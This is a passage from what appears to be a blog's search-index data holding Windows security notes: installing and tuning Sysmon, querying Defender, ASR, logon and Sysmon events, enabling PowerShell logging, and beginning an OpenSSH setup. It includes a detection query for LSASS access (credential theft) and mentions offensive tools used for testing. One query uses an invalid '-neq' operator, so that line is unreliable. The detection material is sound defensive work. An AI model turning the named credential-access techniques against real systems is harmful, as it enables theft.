<p>Evaluate what access to C:\\$PATH is available to $USER:</p> <pre><code>accesschk64.exe \"$USER\" c:\\$PATH\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#sysmon","title":"Sysmon","text":"<ul> <li>https://live.sysinternals.com/Sysmon64.exe</li> <li>https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#installing-sysmon","title":"Installing Sysmon","text":"<p>Open an administrative PowerShell session.</p> <p>Create the tools directory with the correct permissions:</p> <pre><code>New-Item -ItemType Directory -Path \"C:\\Tools\" | Out-Null\nNew-Item -ItemType Directory -Path \"C:\\Tools\\Scripts\" | Out-Null\nicacls.exe C:\\Tools /reset | Out-Null\nicacls.exe C:\\Tools /inheritance:r | Out-Null\nicacls.exe C:\\Tools /grant SYSTEM:\"(CI)(OI)(F)\" | Out-Null\nicacls.exe C:\\Tools /grant BUILTIN\\Administrators:\"(CI)(OI)(F)\" | Out-Null\nicacls.exe C:\\Tools /grant *S-1-1-0:\"(CI)(OI)RX\" | Out-Null\n</code></pre> <p>Download and install Sysmon and a starter configuration file (if you did not write your own).</p> <ul> <li>Sysmon</li> <li>Sysmon Modular - Olaf Hartong</li> <li>Sysmon Config - SwiftOnSecurity</li> </ul> <pre><code># Change to the tools path\ncd C:\\Tools\n\n# If you want to use SwiftOnSecurity's config:\niwr \"https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml\" -OutFile \"C:\\Tools\\sysmon-config.xml\"\n# If you want to use Olaf Hartong's config:\niwr \"https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml\" -OutFile \"C:\\Tools\\sysmon-config.xml\"\n\n# Download Sysmon\niwr \"https://live.sysinternals.com/Sysmon64.exe\" -OutFile \"C:\\Tools\\Sysmon64.exe\"\n\n# Uninstall the currently running Sysmon components with the newest binary if you already have an older version running (does not require reboot)\nC:\\Tools\\Sysmon64.exe -accepteula -u\n\n# Install the newest Sysmon (does not require reboot)\nC:\\Tools\\Sysmon64.exe -accepteula -i C:\\Tools\\sysmon-config.xml\n</code></pre> <p>NOTE: This does not erase or remove current log files, and they can all still be read again after installing the new binary.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#cleanup","title":"Cleanup","text":"<ul> <li>Option 1: Make the config file readable only by SYSTEM and BUILTIN\\Administrator     <pre><code>icacls.exe C:\\Tools\\sysmon-config.xml /inheritance:r\nicacls.exe C:\\Tools\\sysmon-config.xml /grant SYSTEM:\"(F)\"\nicacls.exe C:\\Tools\\sysmon-config.xml /grant BUILTIN\\Administrators:\"(F)\"\n</code></pre></li> <li>Option 2: Delete the config file from the local machine</li> <li>Both: Monitor and log for execution of <code>Sysmon64.exe -c</code> which dumps the entire configuration whether it's still on disk or not. If you find this in your logs and did not run this, you may have been broken into.</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#custom-config","title":"Custom Config","text":"<p>Using Sysmon-Modular it's easy to create custom configuration files.</p> <ul> <li>Sysmon Modular: Generating a Config</li> </ul> <p>Install the configuration with <code>C:\\Tools\\Sysmon64.exe -c .\\sysmonconfig.xml</code> and observe it with your SIEM, the Event Viewer, or Tail-EventLogs.ps1.</p> <p>Adjust rules accordingly. For example, if there's a DLL Side-Loading rule that's overwhelming your logs, you can find which rule files include this rule using the following: <pre><code>. .\\Merge-AllSysmonXml\n\nFind-RulesInBasePath -BasePath C:\\Tools\\sysmon-modular\\ | sls \"DLL Side-Loading\"\n</code></pre></p> <ul> <li>Read the rule criteria based on what you're seeing in your logs.</li> <li>Find the exact line in sysmon-modular's rules to tune it manually.</li> <li>Regenerate the config using <code>Merge-AllSysmonXml -Path ( Get-ChildItem '[0-9]*\\*.xml') -AsString | Out-File sysmonconfig.xml</code>.</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#tune-a-config-with-powershell","title":"Tune a Config (with PowerShell)","text":"<p>This will depend on your configuration file. The sysmon-modular config mentioned above is a great starting place to help you maintain includes and excludes.</p> <p>When first applying a configuration, do it in a test environment mirroring the systems it will be deployed on. Then review what's being logged that's either too much, or not enough. This will likely be accomplished with a SIEM, but if you need to do this with PowerShell you can investigate logs by working big to small in scope.</p> <ul> <li>This will help identify what's being logged too much</li> <li>This is not the most effective way to find what isn't being logged</li> <li>To find what's not being logged you'll need to conduct (offensive) testing on your environment<ul> <li>Atomic-Red-Team can help with this</li> </ul> </li> </ul> <p>Find the frequency of all Sysmon Events: <pre><code>$StartDate = (Get-Date).AddDays(-1)\nGet-WinEvent -FilterHashtable @{ Logname='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate } | Group-Object -Property Id | Select-Object Name, Count | Sort-Object Count -Descending\n</code></pre></p> <p>Find the frequency of a known property in each event (in this case, the RuleName from sysmon-modular): <pre><code>$StartDate = (Get-Date).AddDays(-1)\nGet-WinEvent -FilterHashtable @{ Logname='Microsoft-Windows-Sysmon/Operational'; Id='10' } | ForEach-Object { $_.properties[0].value }| Group-Object | Sort-Object -Property Count, Descending | select Count, Name\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#windows-logging","title":"Windows Logging","text":"<p>To see all available logs on a (Windows) system:</p> <pre><code>Get-WinEvent -ListLog * | Select -Property LogName\n</code></pre> <p>To see the available properties for a log, use:</p> <pre><code>Get-WinEvent -MaxEvents 1 -LogName '&lt;log&gt;' | select -Property *\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#event-logs","title":"Event Logs","text":"<ul> <li>Microsoft Docs: Event IDs to Monitor</li> <li>Intro to SOC: Domain Log Review</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#log-size","title":"Log Size","text":"<ul> <li>Tenable: STIG SERVER2019 Security Event Log 196608 KB</li> <li>Tenable: STIG WIN10 Security Event Log 1024000 KB</li> <li>TrendMicro: Event Log File Sizes</li> <li>Splunk: Configuring Sysmon Logging</li> </ul> <p>Independant of how long your SIEM or central logging server is retaining all logs shipped to it, each endpoint should maintain between 200MB to 1GB (or more if the machine can tolerate it) of Sysmon and or Security event logs to ensure all events are properly captured and forwarded (not lost).</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#windows-defender-logs","title":"Windows Defender Logs","text":"<ul> <li>Defender Event Log and Error Codes</li> </ul> <p>Get the latest instance of Id 1116, <code>MALWAREPROTECTION_STATE_MALWARE_DETECTED</code>:</p> <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=$StartDate; Id='1116'; } | Select -First 1 | fl\n</code></pre> <p>Get all \"Warning\" events that aren't Id 1002, <code>MALWAREPROTECTION_SCAN_CANCELLED</code> (which can be a noisy event):</p> <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=$StartDate; } | where { $_.LevelDisplayName -eq 'Warning' -and $_.Id -ne 1002 }\n</code></pre> <p>Find any instances of Defender's configuration being changed:</p> <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=$StartDate; } | where { $_.Id -eq 5004 -or  $_.Id -eq 5007  }\n</code></pre> <p>Find any instances of Defender components being disabled or off:</p> <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=$StartDate; } | where { $_.Id -eq 5001 -or  $_.Id -eq 5008 -or $_.Id -eq 5010 -or $_.Id -eq 5012 }\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#asr-events","title":"ASR Events","text":"<ul> <li>List of ASR Events</li> </ul> <p>The link above includes raw XML you can import into the event viewer to filter for only ASR related log entries. The XML also contains the paths needed to query the event logs from PowerShell. This is a copy of that table for reference:</p> Feature Provider/source Event ID Description Exploit protection Security-Mitigations (Kernel Mode/User Mode) 1 ACG audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 2 ACG enforce Exploit protection Security-Mitigations (Kernel Mode/User Mode) 3 Don't allow child processes audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 4 Don't allow child processes block Exploit protection Security-Mitigations (Kernel Mode/User Mode) 5 Block low integrity images audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 6 Block low integrity images block Exploit protection Security-Mitigations (Kernel Mode/User Mode) 7 Block remote images audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 8 Block remote images block Exploit protection Security-Mitigations (Kernel Mode/User Mode) 9 Disable win32k system calls audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 10 Disable win32k system calls block Exploit protection Security-Mitigations (Kernel Mode/User Mode) 11 Code integrity guard audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 12 Code integrity guard block Exploit protection Security-Mitigations (Kernel Mode/User Mode) 13 EAF audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 14 EAF enforce Exploit protection Security-Mitigations (Kernel Mode/User Mode) 15 EAF+ audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 16 EAF+ enforce Exploit protection Security-Mitigations (Kernel Mode/User Mode) 17 IAF audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 18 IAF enforce Exploit protection Security-Mitigations (Kernel Mode/User Mode) 19 ROP StackPivot audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 20 ROP StackPivot enforce Exploit protection Security-Mitigations (Kernel Mode/User Mode) 21 ROP CallerCheck audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 22 ROP CallerCheck enforce Exploit protection Security-Mitigations (Kernel Mode/User Mode) 23 ROP SimExec audit Exploit protection Security-Mitigations (Kernel Mode/User Mode) 24 ROP SimExec enforce Exploit protection WER-Diagnostics 5 CFG Block Exploit protection Win32K (Operational) 260 Untrusted Font Network protection Windows Defender (Operational) 5007 Event when settings are changed Network protection Windows Defender (Operational) 1125 Event when Network protection fires in Audit-mode Network protection Windows Defender (Operational) 1126 Event when Network protection fires in Block-mode Controlled folder access Windows Defender (Operational) 5007 Event when settings are changed Controlled folder access Windows Defender (Operational) 1124 Audited Controlled folder access event Controlled folder access Windows Defender (Operational) 1123 Blocked Controlled folder access event Controlled folder access Windows Defender (Operational) 1127 Blocked Controlled folder access sector write block event Controlled folder access Windows Defender (Operational) 1128 Audited Controlled folder access sector write block event Attack surface reduction Windows Defender (Operational) 5007 Event when settings are changed Attack surface reduction Windows Defender (Operational) 1122 Event when rule fires in Audit-mode Attack surface reduction Windows Defender (Operational) 1121 Event when rule fires in Block-mode <p>Notable paths for PowerShell parsing include the following (keeping in mind only the event ID's above apply):</p> <ul> <li><code>LogName='Microsoft-Windows-Security-Mitigations/UserMode'</code></li> <li><code>LogName='Microsoft-Windows-Security-Mitigations/KernelMode'</code></li> <li><code>LogName='Microsoft-Windows-Win32k/Operational'</code></li> <li><code>LogName='Microsoft-Windows-WER-Diag/Operational'</code></li> <li><code>LogName='Microsoft-Windows-Windows Defender/Operational'</code></li> </ul> <p>Example queries, based on <code>LogName</code> and <code>$_.Id</code>:</p> <pre><code>$StartDate = (Get-Date).AddDays(-1)\nGet-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Security-Mitigations/UserMode'; StartTime=$StartDate; }\nGet-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Security-Mitigations/KernelMode'; StartTime=$StartDate; } | where { $_.Id -neq 11 -and  $_.Id -neq 12  }\nGet-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=$StartDate; } | where { $_.Id -eq 1121 -or  $_.Id -eq 1122  } | fl *\n</code></pre> <p>It's important to note that when a user is notified via a toast notificaiton, the alert details are not always available within the Windows Defender GUI to review. Using PowerShell will allow you to extract any matching logs and all details.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#logon-events","title":"Logon Events","text":"<p>This can be difficult to understand at first, as the normal Logon (ID 4624) and Logoff (ID 4634) events will produce numerous entries even if you simply sign out and back in to an account locally. Using these events alone can be difficult if you're trying to trace behavior. If you're looking for something similar to Linux's <code>last | head</code> then you need to query the Explicit Logon Attempt event (ID 4648).</p> <pre><code>Get-WinEvent -FilterHashtable @{LogName='Security'} | where TimeCreated -gt (Get-Date).AddDays(-1) | where Id -eq '4648'\nGet-WinEvent -FilterHashtable @{LogName='Security'} | where TimeCreated -gt (Get-Date).AddDays(-1) | where Id -eq '4648' | fl\n</code></pre> <p>You can also use offensive tools to do this, such as Seatbelt, which returns easily readable results:</p> <pre><code>.\\Seatbelt.exe ExplicitLogonEvents\n</code></pre> <p>I wanted to mimic Seathbelt's output in PowerShell, so I wrote this script to accomplish that. This includes references to the Sysmon Logs section here, and also to the C# source code for the ExplicitLogonEvents module in Seatbelt.</p> <pre><code># MIT License\n#\n# Print unique logon information for a Windows system using built in event logs, in a clear way.\n# This returns every user login by default, but you can swap around variables below to suit your needs\n# As is, this will also catch shells like \"runas /user:username cmd.exe\"\n#\n# This script is meant to return data in a similar format as \".\\Seatbelt.exe ExplicitLogonEvents\" would:\n# [GhostPack/Seatbelt - ExplicitLogonEvents](https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Commands/Windows/EventLogs/ExplicitLogonEvents/ExplicitLogonEventsCommand.cs)\n#\n# Parsing logs like this was learned from:\n# [Security Weekly Webcast - Sysmon: Gaining Visibility Into Your Enterprise](https://securityweekly.com/webcasts/sysmon-gaining-visibility-into-your-enterprise/)\n# [Slide Deck](https://securityweekly.com/wp-content/uploads/2022/04/alan-stacilauskas-unlock-sysmon-slide-demov4.pdf)\n#\n# Huge thanks to the presentors:\n#\n# [Alan Stacilauskas](https://www.alstacilauskas.com/)\n# [Amanda Berlin](https://twitter.com/@infosystir)\n# [Tyler Robinson](https://twitter.com/tyler_robinson)\n\n# Set a range of time to search in the logs\n# AddMinutes / AddHours / AddDays / AddMonths\n$startTime = (Get-Date).AddDays(-1)\n\n# This line will get you the relevant event log data to begin parsing\nGet-WinEvent -FilterHashtable @{LogName='Security'} | where TimeCreated -gt $startTime | where Id -eq '4648' | foreach {\n    # Variable names were kept the same as they are in Seatbelt's ExplicitLogonEventsCommand.cs\n    # Variable properties can be extracted from the Windows Event ID 4648 $_.Message object:\n    $creationTime = $_.TimeCreated\n    $subjectUserSid = $_.properties[0].value\n    $subjectUserName = $_.properties[1].value\n    $subjectDomainName = $_.properties[2].value\n    $subjectLogonId = $_.properties[3].value\n    $logonGuid = $_.properties[4].value\n    $targetUserName = $_.properties[5].value\n    $targetDomainName = $_.properties[6].value\n    $targetLogonGuid = $_.properties[7].value\n    $targetServerName = $_.properties[8].value\n    $targetServerInfo = $_.properties[9].value\n    $processId = $_.properties[10].value\n    $processName = $_.properties[11].value\n    $ipAddress = $_.properties[12].value\n    $ipPort = $_.properties[13].value\n\n    # You can change this pattern variable and the if statement itself below if you'd like to search for different data\n    # Basically the \"user logging in\" part of the login sequence captured by event logs is made by svchost.exe and not winlogon.exe\n    $patternToMatch = 'winlogon.exe'\n\n    # Another approach is filtering for a blank username:\n    # if ($targetUserName -ne $nul) { ...\n    #\n    # Alternatively you could filter for:\n    # if ($targetUserName -inotmatch \"(UMFD-\\d|DWM-\\d)\") { ...\n    # DWM-\\d matches patterns of the Desktop Window Manager user\n    # UMFD-\\d matches patterns of the Font Driver Host user\n\n    # Lastly, you could filter based on the source IP Address:\n    # if ($ipAddress -match $patternToMatch) {\n\n    if ($processName -inotmatch $patternToMatch) {\n        Write-Host \"$creationTime, $targetUserName, $targetDomainName, $targetServerName, $processName, $ipAddress\"\n    }\n}\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#powershell-logs","title":"PowerShell Logs","text":"<ul> <li>At minimum, enable Script Block logging (without Invocation Logging)</li> <li>If possible, enable Transcription to a protected directory that's sent to a central logging server</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#module-logging","title":"Module Logging","text":"<p>Enable logging for selected PowerShell modules.</p> <p>This may not be necessary if you enable script block logging.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#script-block-logging","title":"Script Block Logging","text":"<p>Logs PowerShell input (commands, functions, decodes and tracks script content)</p> <ul> <li>Enable Script Block Logging</li> <li><code>Get-ItemProperty -Path \"HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"</code></li> <li><code>Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows PowerShell &gt; Turn on PowerShell Script Block Logging</code></li> <li>Log Name: <code>Microsoft-Windows-PowerShell/Operational</code></li> <li>Log Path: <code>C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx</code></li> </ul> <p>Invocation Logging is an entirely optional checkbox under this Group Policy setting. It logs the start and stop of executions. This will flood your logs.</p> <p>Enable Script Block Logging (without the start / stop Invocation Logging option):</p> <pre><code># https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1#using-the-registry\n$basePath = @(\n    'HKLM:\\Software\\Policies\\Microsoft\\Windows'\n    'PowerShell\\ScriptBlockLogging'\n) -join '\\'\n\nif (-not (Test-Path $basePath)) {\n    $null = New-Item $basePath -Force\n}\n\nSet-ItemProperty $basePath -Name EnableScriptBlockLogging -Value \"1\"\nSet-ItemProperty $basePath -Name EnableScriptBlockInvocationLogging -Value \"0\"\n</code></pre> <p>Remove Script Block Logging:</p> <pre><code># https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1#using-the-registry\n$basePath = @(\n    'HKLM:\\Software\\Policies\\Microsoft\\Windows'\n    'PowerShell\\ScriptBlockLogging'\n) -join '\\'\n\nif (Test-Path $basePath) {\n    Remove-ItemProperty $basePath -Name EnableScriptBlockLogging\n    Remove-ItemProperty $basePath -Name EnableScriptBlockInvocationLogging\n}\n</code></pre> <p>Script Block logging has the benefit of being able to unwrap obfuscated functions and record their raw text.</p> <p>This code sample from the Microsoft Docs link above reassembles large script blocks logged across multiple entries:</p> <pre><code>$created = Get-WinEvent -FilterHashtable @{ ProviderName=\"Microsoft-Windows-PowerShell\"; Id = 4104 } |\n  Where-Object { $_.&lt;...&gt; }\n$sortedScripts = $created | sort { $_.Properties[0].Value }\n$mergedScript = -join ($sortedScripts | % { $_.Properties[2].Value })\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#transcription-logging","title":"Transcription Logging","text":"<p>Logs PowerShell output (everything that appears in the powershell terminal session)</p> <ul> <li>PowerShell Transcription</li> <li><code>HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription</code></li> <li><code>Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows PowerShell &gt; Turn on PowerShell Script Block Logging</code></li> <li>Log path is up to the user, written as a text file</li> </ul> <p>Enable PowerShell transcription, write output to C:\\PSTranscripts:</p> <pre><code># https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1#using-the-registry\n# https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_config?view=powershell-7.3#transcription\n# https://github.com/clr2of8/PowerShellForInfoSec/blob/main/Tools/Set-PSLogging.ps1\n$basePath = @(\n    'HKLM:\\Software\\Policies\\Microsoft\\Windows'\n    'PowerShell\\Transcription'\n) -join '\\'\n\nif (-not (Test-Path $basePath)) {\n    $null = New-Item $basePath -Force\n}\n\nSet-ItemProperty $basePath -Name EnableTranscripting -Value \"1\"\nSet-ItemProperty $basePath -Name EnableInvocationHeader -Value \"1\"\nSet-ItemProperty $basePath -Name OutputDirectory -Value \"C:\\PSTranscripts\"\n</code></pre> <p>Remove PowerShell Transcription:</p> <pre><code># https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1#using-the-registry\n# https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_config?view=powershell-7.3#transcription\n# https://github.com/clr2of8/PowerShellForInfoSec/blob/main/Tools/Set-PSLogging.ps1\n$basePath = @(\n    'HKLM:\\Software\\Policies\\Microsoft\\Windows'\n    'PowerShell\\Transcription'\n) -join '\\'\n\nif (Test-Path $basePath) {\n    Remove-ItemProperty $basePath -Name EnableTranscripting\n    Remove-ItemProperty $basePath -Name EnableInvocationHeader\n    Remove-ItemProperty $basePath -Name OutputDirectory\n}\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#sysmon-logs","title":"Sysmon Logs","text":"<p>This is a quick start on how to read your Sysmon logs. - Get-WinEvent</p> <p>These will help in building statements to parse logs conditionally with more granularity: - PowerShell if Statements - Out-String</p> <p>Note that if you do not use <code>Sort-Object -Unique</code> or similar, logs will be displayed from oldest (top) to newest (bottom). It is also not necessary to use <code>Out-String</code> if you prefer working with PowerShell objects over strings.</p> <ul> <li>Group-Object</li> </ul> <p>Another tip is using <code>&lt;cmds&gt;... | Group-Object | Select-Object Count, Name | Sort-Object Count -Descending</code>. This is the PowerShell equivalent to Unix's <code>... | sort | uniq -c | sort -nr</code>, grouping unique results into order based on occurrance.</p> <p>This webcast is an excellent resource, not just for rule creation but various ways to script and parse logs, and essentially a quick start to Sysmon threat hunting via the CLI and GUI:</p> <ul> <li>Security Weekly Webcast - Sysmon: Gaining Visibility Into Your Enterprise</li> <li>Slide Deck</li> </ul> <p>Huge thanks to the presentors:</p> <ul> <li>Alan Stacilauskas</li> <li>Amanda Berlin</li> <li>Tyler Robinson</li> </ul> <p>Additional resources from the presentation, discord, and other trainings:</p> <ul> <li>Poshim - Automated Windows Log Collection</li> <li>Chainsaw</li> <li>DeepBlueCLI</li> <li>Hayabusa</li> <li>Sysmon Modular - Olaf Hartong</li> <li>Sysmon Config - SwiftOnSecurity</li> </ul> <p>There are two easy ways of parsing log output:</p> Technique TypeName <code>\\| select { $_.properties[4].value }</code> Selected.System.Diagnostics.Eventing.Reader.EventLogRecord <code>\\| ForEach-Object { Out-String -InputObject $_.properties[4].value }</code> System.String <p>The technique of using <code>ForEach-Object { Out-String -InputObject $_.properties[x,y,z].value }</code> was highlighted during the webcast.</p> <p>To parse any event logs quickly and effectively:</p> <ul> <li>Use a hash table</li> <li>Set a start time</li> <li>Obtain object property values</li> </ul> <p>You can get any log's property values by piping it to <code>| select -First 1 | fl</code>. Each line in the Message block relates to a value.</p> <p>Specify multiple values like this: <code>$_.properties[0,1,5,6].value</code></p> <p>You can also specifiy a series of values with two <code>..</code> dots between them like: <code>$_.properties[0..20].value</code></p> <p>Set the start time as a variable: <pre><code>$StartDate = (Get-Date).AddMinutes(-30)\n$StartDate = (Get-Date).AddHours(-1)\n$StartDate = (Get-Date).AddDays(-2)\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#sysmon-event-ids","title":"Sysmon Event IDs","text":"<p>These references can help you sort through event properties visually.</p> <ul> <li>Sysmon: Events</li> <li>BHIS: Sysmon Event ID Breakdown</li> <li>olafhartong/sysmon-cheatsheet (PDF)</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#id-22-dns-queries","title":"ID 22: DNS Queries","text":"<p>DNS query property values:</p> <ul> <li>[0]RuleName</li> <li>[1]UtcTime</li> <li>[2]ProcessGuid</li> <li>[3]ProcessId</li> <li>[4]QueryName</li> <li>[5]QueryStatus</li> <li>[6]QueryResults</li> <li>[7]Image</li> <li>[8]User</li> </ul> <p>Show all unique DNS queries (ID 22) and sort them by frequency: <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='22' } | ForEach-Object { $_.properties[4].value } | Group-Object | Sort-Object -Property Count -Descending | Select Count,Name\n</code></pre></p> <p>Show all DNS queries (ID 22) that contain \"google\": <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='22' } | Where-Object { $_.properties[4].value -imatch \"google\" } | ForEach-Object { $_.properties[4].value } | Group-Object | Sort-Object -Property Count -Descending | Select Count,Name\n</code></pre></p> <p>Show all DNS queries (ID 22) and when they were made: <pre><code>Get-WinEvent -FilterHashtable @{ Logname='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='22' } | ForEach-Object { Out-String -InputObject $_.properties[1,4].value }\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#id-3-network-connection","title":"ID 3: Network Connection","text":"<p>Network connection property values:</p> <ul> <li>[0]RuleName</li> <li>[1]UtcTime</li> <li>[2]ProcessGuid</li> <li>[3]ProcessId</li> <li>[4]Image</li> <li>[5]User</li> <li>[6]Protocol</li> <li>[7]Initiated</li> <li>[8]SourceIsIpv6</li> <li>[9]SourceIp</li> <li>[10]SourceHostname</li> <li>[11]SourcePort</li> <li>[12]SourcePortName</li> <li>[13]DestinationIsIpv6</li> <li>[14]DestinationIp</li> <li>[15]DestinationHostname</li> <li>[16]DestinationPort</li> <li>[17]DestinationPortName</li> </ul> <p>Show all unique executables that made a network connection, filter out <code>msedge.exe</code> and <code>svchost.exe</code>, sort by frequency: <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id='3' } | where { $_.properties[4].value -inotmatch \"(msedge.exe|svchost.exe)\" } | ForEach-Object { $_.properties[4].value } | Group-Object | Sort-Object -Property Count -Descending | Select Count, Name\n</code></pre></p> <p>Using the query above, get all unique destination IPs, sort by frequency:</p> <ul> <li>Use this to filter network activity</li> <li>Feed the returned list of IPs to a threat intel platform</li> </ul> <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id='3' } | where { $_.properties[4].value -inotmatch \"(msedge.exe|svchost.exe)\" } | ForEach-Object { $_.properties[14].value } | Group-Object | Sort-Object -Property Count -Descending | Select Count, Name\n</code></pre> <p>Show all network connections (ID 3), what executable made them, when, and destination IP / hostname: <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='3' } | ForEach-Object { Out-String -InputObject $_.properties[1,4,14,15].value }\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#id-1-process-creation","title":"ID 1: Process Creation","text":"<p>Process creation property values: - [0]RuleName - [1]UtcTime - [2]ProcessGuid - [3]ProcessId - [4]Image - [5]FileVersion - [6]Description - [7]Product - [8]Company - [9]OriginalFileName - [10]CommandLine - [11]CurrentDirectory - [12]User - [13]LogonGuid - [14]LogonId - [15]TerminalSessionId - [16]IntegrityLevel - [17]Hashes - [18]ParentProcessGuid - [19]ParentProcessId - [20]ParentImage - [21]ParentCommandLine - [22]ParentUser</p> <p>List all processes created (ID 1) by timestamp, PID, executable, commandline, executable hashes, and PPID: <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='1' } | ForEach-Object { Out-String -InputObject $_.properties[1,3,4,10,17,19].value }\n</code></pre></p> <p>List all details of all processes created (ID 1): <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='1' } | fl\n</code></pre></p> <p>List all details of (ID 1) log entries where the RuleName field contains \"Discovery\": <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='1' } | where { $_.properties[0].value -imatch \"Discovery\" } | fl\n</code></pre></p> <p>List how many times each executable created a process (ID 1), sorted by frequency: <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='1' } | ForEach-Object { $_.properties[4].value } | Group-Object | Sort-Object -Property Count -Descending | Select Count,Name\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#id-10-process-accessed","title":"ID 10: Process Accessed","text":"<p>Process accessed property values: - [0]RuleName - [1]UtcTime - [2]SourceProcessGUID - [3]SourceProcessId - [4]SourceThreadId - [5]SourceImage - [6]TargetProcessGUID - [7]TargetProcessId - [8]TargetImage - [9]GrantedAccess - [10]CallTrace - [11]SourceUser - [12]TargetUser</p> <p>Detect LSASS access (currently this just matches the first entry that has the string \"lsass\" anywhere in the log, needs revised to be more precise): <pre><code>Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$StartDate; Id='10' } | Where-Object { $_.properties[0..30].value -imatch \"lsass\" } | Select -First 1 | fl *\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#services","title":"Services","text":""},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#openssh","title":"OpenSSH","text":"Directory Description <code>C:\\ProgramData\\ssh\\</code> Main configuration folder, <code>/etc/ssh/</code> equivalent <code>C:\\Users\\$USER\\.ssh\\</code> User folder, <code>~/.ssh</code> equivalent <p>Steps to setup OpenSSH Server (The OpenSSH Client is typically installed by default).</p> <ol> <li> <p>Update Windows</p> </li> <li> <p>Install OpenSSH Server Optional Feature</p> </li> </ol> <p>See the following Microsoft documentation of OpenSSH for additional context:</p> <p>https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse</p> <pre><code>Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'\n\n# Install the OpenSSH Client\nAdd-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0\n\n# Install the OpenSSH Server\nAdd-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\n\n# Start the sshd service\nStart-Service sshd\n</code></pre> <ol> <li>Configure:</li> </ol> <pre><code># OPTIONAL but recommended:\nSet-Service -Name sshd 